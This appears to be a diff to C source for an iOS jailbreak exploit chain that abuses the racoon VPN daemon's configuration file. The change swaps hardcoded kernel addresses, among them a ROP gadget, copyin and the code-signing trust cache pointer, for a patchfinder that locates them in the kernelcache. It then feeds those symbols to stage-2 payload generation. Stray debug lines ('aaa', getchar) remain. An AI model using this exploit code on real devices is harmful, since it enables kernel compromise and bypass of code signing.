@@ -8,10 +8,19 @@
 #include "stage2.h"
 #include "uland_offsetfinder.h"
 #include "../shared/realsym.h"
+#include "symbols.h"
+#include "patchfinder.h"
 
 int install(const char *config_path, const char *racoon_path, const char *dyld_cache_path)
 {
 	init_uland_offsetfinder(racoon_path,dyld_cache_path);
+
+	jake_symbols_t kernel_symbols = malloc(sizeof(jake_symbols));
+	if (jake_init_symbols(kernel_symbols,"/System/Library/Caches/com.apple.kernelcaches/kernelcache")) {
+		LOG("Patchfinder init failed\n");
+		return -1;
+	}
+
 	offset_struct_t myoffsets;
 	// for the symbol finder we need a string xref finder and some instruction decoding mechanism
 	// we need to have some xref finder for code
@@ -19,6 +28,8 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 
 	// find the address of "No more than %d WINS" and "failed to set my ident %s" then an xref to the error handling code and then an xref which calls that code, for the first one you need to find an adr and for the second one you need an ldr
 	myoffsets.dns4_array_to_lcconf = -((isakmp_cfg_config_addr()+0x28-4*8)-lcconf_addr()); 
+	printf("aaa\n");
+	getchar();
 	myoffsets.lcconf_counter_offset = 0x10c; // we could try and find that dynamically or we could just hardcode it cause it prob doesn't change on 11.x (TODO: get that dynamically)
 	myoffsets.memmove = memmove_cache_ptr(dyld_cache_path);  // strlcpy second branch
 	myoffsets.longjmp = realsym(dyld_cache_path,"__longjmp"); // dlsym
@@ -50,13 +61,13 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.stage2_max_size = 0x200000;
 	myoffsets.thread_max_size = 0x10000;
 	myoffsets.ipr_size = 8;
-	myoffsets.rootdomainUC_vtab = 0xfffffff00708e158; // iometa
+	myoffsets.rootdomainUC_vtab = find_symbol(kernel_symbols,"__ZTV20RootDomainUserClient");
 	myoffsets.itk_registered = 0x2f0;
 	myoffsets.is_task = 0x28;
-	myoffsets.copyin = 0xfffffff0071aa804; // nm
-	myoffsets.gadget_add_x0_x0_ret = 0xfffffff0073ce75c; // nm (there's a csblob func doing that)
-	myoffsets.swapprefix_addr = 0xfffffff0075b18cc; // search for the string "/private/var/vm/swapfile" in the kernel that's the right address
-	myoffsets.trust_chain_head_ptr = 0xfffffff0076b8ee8; // idk but I think the patchfinder can do that
+	myoffsets.copyin = find_symbol(kernel_symbols,"_copyin");
+	myoffsets.gadget_add_x0_x0_ret = find_symbol(kernel_symbols,"_csblob_get_cdhash");
+	myoffsets.swapprefix_addr = find_swapprefix(kernel_symbols); // search for the string "/private/var/vm/swapfile" in the kernel that's the right address
+	myoffsets.trust_chain_head_ptr = find_trustcache(kernel_symbols); // idk but I think the patchfinder can do that
 	myoffsets.stage3_fileoffset = 0;
 	myoffsets.stage3_loadaddr = myoffsets.new_cache_addr-0x100000;
 	myoffsets.stage3_size = 0x10000; // get the file size and round at page boundry
@@ -65,7 +76,7 @@ int install(const char *config_path, const char *racoon_path, const char *dyld_c
 	myoffsets.stage3_CS_blob_size = 624; // same for this one
 
 	// generate stage 2 before stage 1 cause stage 1 needs to know the size of it
-	stage2(&myoffsets,"/private/etc/racoon/");
+	stage2(kernel_symbols,&myoffsets,"/private/etc/racoon/");
 
 	// TODO: make sure that the directory exists
 	int f = open("/var/run/racoon/test.conf",O_WRONLY | O_CREAT,0644);
